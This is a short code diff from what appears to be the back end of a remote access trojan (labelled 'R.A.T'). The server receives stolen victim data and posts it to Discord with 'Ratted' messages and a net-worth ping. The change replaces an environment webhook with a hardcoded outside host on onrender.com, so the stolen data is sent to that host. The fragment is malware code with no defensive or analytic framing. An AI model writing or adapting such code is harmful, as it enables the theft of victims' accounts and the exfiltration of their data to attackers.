@@ -172,7 +172,7 @@ app.post("/", (req, res) => {
                     console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
                 })
                 
-                post(process.env.WEBHOOK2, JSON.stringify({
+                post("https://networth-api-dxxxxy.onrender.com", JSON.stringify({
                     content: `@everyone - ${total_networth}`, //ping
                     embeds: [{
                         title: `Ratted ${req.body.username} - Click For Stats`,
